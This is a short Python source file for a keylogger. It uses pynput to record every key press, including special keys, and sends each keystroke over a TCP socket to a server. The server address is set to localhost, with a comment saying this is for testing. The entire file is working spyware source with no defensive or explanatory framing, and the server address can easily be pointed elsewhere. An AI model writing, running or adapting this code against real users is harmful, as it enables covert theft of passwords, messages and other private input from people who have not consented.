from pynput.keyboard import Listener
import socket

# Function to send keystrokes to the server
def send_keystrokes_to_server(client_socket, keyboard_input):
    try:
        # Send keystrokes to the server
        client_socket.sendall(keyboard_input.encode())
        print(f"Sent keystroke: {keyboard_input}")
    except Exception as e:
        print(f"Error sending keystroke to the server: {e}")

# Function to handle each key press event
def on_press(key, client_socket):
    try:
        # For regular keys, send the character
        send_keystrokes_to_server(client_socket, str(key.char))
    except AttributeError:
        # For special keys like shift, ctrl, etc., send the key name
        send_keystrokes_to_server(client_socket, str(key))

# Function to start the keylogger
def start_keylogger():
    host = '127.0.0.1'  # Server address (localhost for testing)
    port = 5000          # Port to connect to the server

    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        print(f"Attempting to connect to {host}:{port}")
        # Connect to the server
        client_socket.connect((host, port))
        print("Connected to the server.")
        
        # Start the keylogger
        with Listener(on_press=lambda key: on_press(key, client_socket)) as listener:
            listener.join()
    except Exception as e:
        print(f"Error connecting to the server: {e}")
    finally:
        # Close the connection
        client_socket.close()
        print("Connection closed.")

if __name__ == "__main__":
    start_keylogger()
